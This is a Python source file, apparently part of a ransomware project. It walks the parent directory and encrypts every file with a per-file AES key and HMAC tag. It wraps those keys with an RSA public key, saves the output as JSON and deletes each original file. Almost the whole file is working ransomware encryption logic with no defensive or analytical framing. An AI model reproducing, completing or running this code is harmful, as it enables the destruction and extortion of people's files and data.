from base64 import b64encode, b64decode
import encryption, constants, os, json, cryptools


'''

Encrypts everything in the directory
where this program is executed

'''

def main():

	folder_path = '..'

	rsa_cipher = encryption.AsymmetricCipher(constants.RSA_FOLDER_PATH)

	for current_directory, sub_directories, sub_files in os.walk(folder_path):

		if 'ransomware' in current_directory.lower():
			continue

		for file in sub_files:

			if len(file.split('.')) == 0 or file.endswith('json'):
				continue

			json_dict = dict()

			ext = file.split('.')[-1]

			fileName = ''.join(file.split('.')[:-1])

			aes_key = os.urandom(constants.AES_KEY_LENGTH)

			aes_iv = os.urandom(constants.IV_LENGTH)

			aes_cipher = encryption.SymmetricCipher(aes_key, aes_iv)

			hmac_key = os.urandom(constants.HMAC_KEY_LENGTH)

			with open(os.path.join(current_directory, file), 'rb') as f:
				ciphertext = aes_cipher.Encrypt(f.read())

			tag = cryptools.HMAC(ciphertext, hmac_key)

			encrypted_keys = rsa_cipher.Encrypt(aes_key + hmac_key)


			json_dict['IV'] = b64encode(aes_iv)
			json_dict['KEY'] = b64encode(encrypted_keys)
			json_dict['TAG'] = b64encode(tag)
			json_dict['EXT'] = b64encode(ext)
			json_dict['CIPHER'] = b64encode(ciphertext)

			with open(os.path.join(current_directory, fileName + '.json'), 'w') as json_file:
				json.dump(json_dict, json_file)

			os.remove(os.path.join(current_directory, file))
			print('\n[+] Encrypted %s\n' % os.path.join(current_directory, file))

	


if __name__ == '__main__':
	main()
